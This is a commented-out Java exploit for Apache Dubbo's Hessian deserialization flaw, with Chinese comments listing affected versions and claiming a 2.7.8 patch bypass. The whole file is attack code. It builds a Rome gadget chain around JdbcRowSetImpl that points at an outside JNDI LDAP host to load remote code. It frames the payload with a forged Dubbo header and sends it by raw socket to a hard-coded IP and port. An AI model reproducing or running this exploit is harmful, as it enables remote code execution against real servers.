//package org.exploit.third.Dubbo;
//
//import com.caucho.hessian.io.Hessian2Output;
//import com.rometools.rome.feed.impl.EqualsBean;
//import com.rometools.rome.feed.impl.ToStringBean;
//import com.sun.rowset.JdbcRowSetImpl;
//import java.io.ByteArrayOutputStream;
//import java.io.OutputStream;
//import java.lang.reflect.Array;
//import java.lang.reflect.Constructor;
//import java.net.Socket;
//import java.util.HashMap;
//import java.util.Random;
//
//import marshalsec.HessianBase;
//import marshalsec.util.Reflections;
//import org.apache.dubbo.common.io.Bytes;
//import org.apache.dubbo.common.serialize.Cleanable;
////Apache Dubbo 2.7.0 ~ 2.7.6
////Apache Dubbo 2.6.0 ~ 2.6.7
////Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)。
////在实际测试中2.7.8补丁绕过可以打，而2.7.9失败
//
//public class GadgetsTestHessian {
//    public static void main(String[] args) throws Exception {
//        JdbcRowSetImpl rs = new JdbcRowSetImpl();
//        //todo 此处填写ldap url
//        rs.setDataSourceName("ldap://9731pz95hm92.vicp.fun:20172/aIWNwcOz");
//        rs.setMatchColumn("foo");
//        Reflections.setFieldValue(rs, "listeners",null);
//
//        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
//        EqualsBean root = new EqualsBean(ToStringBean.class, item);
//
//        HashMap s = new HashMap<>();
//        Reflections.setFieldValue(s, "size", 1);
//        Class<?> nodeC;
//        try {
//            nodeC = Class.forName("java.util.HashMap$Node");
//        }
//        catch ( ClassNotFoundException e ) {
//            nodeC = Class.forName("java.util.HashMap$Entry");
//        }
//        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
//        nodeCons.setAccessible(true);
//
//        Object tbl = Array.newInstance(nodeC, 1);
//        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
//        Reflections.setFieldValue(s, "table", tbl);
//
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//
//        // header.
//        byte[] header = new byte[16];
//        // set magic number.
//        Bytes.short2bytes((short) 0xdabb, header);
//        // set request and serialization flag.
//        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
//
//        // set request id.
//        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
//
//        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
//        Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
//        HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
//        sf.setAllowNonSerializable(true);
//        out.setSerializerFactory(sf);
//
//        out.writeObject(s);
//
//        out.flushBuffer();
//        if (out instanceof Cleanable) {
//            ((Cleanable) out).cleanup();
//        }
//
//        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
//        byteArrayOutputStream.write(header);
//        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
//
//        byte[] bytes = byteArrayOutputStream.toByteArray();
//
//        //todo 此处填写被攻击的dubbo服务提供者地址和端口
//        Socket socket = new Socket("123.56.67.102", 20880);
//        OutputStream outputStream = socket.getOutputStream();
//        outputStream.write(bytes);
//        outputStream.flush();
//        outputStream.close();
//    }
//}